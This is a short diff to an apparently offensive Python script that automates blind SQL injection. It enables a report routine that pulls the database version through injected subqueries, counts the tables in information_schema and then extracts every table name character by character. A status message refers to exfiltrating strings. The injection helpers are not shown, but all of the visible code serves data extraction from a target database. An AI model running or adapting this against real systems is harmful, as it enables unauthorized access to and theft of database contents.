@@ -134,12 +134,19 @@ async def get_string(sub_query:str, strlen: int):
             print(F"(+) Could not exfil string with subquery [{sub_query}].")
             exit(1)
 async def report():
-    #version_len = await get_length("select version()")
-    #print(version_len)
-    #num_tables = await get_count("SELECT COUNT(table_name) FROM information_schema.tables")
-    #print(num_tables)
+    version_len = await get_length("select version()")
+    print(version_len)
     version = await get_string("select version()", 19)
     print(version)
+    num_tables = await get_count("SELECT COUNT(table_name) FROM information_schema.tables")
+    print(num_tables)
+    table_name_lengths = []
+    tables = []
+    for i in range (0, num_tables):
+        table_name_lengths.append(await get_length(F"SELECT table_name FROM information_schema.tables LIMIT {i},1"))
+        print(i, ":", table_name_lengths[i])
+        tables.append(await get_string(F"SELECT table_name FROM information_schema.tables LIMIT {i},1", table_name_lengths[i]))
+        print(tables[i], ":", table_name_lengths[i])
 
     pass
 
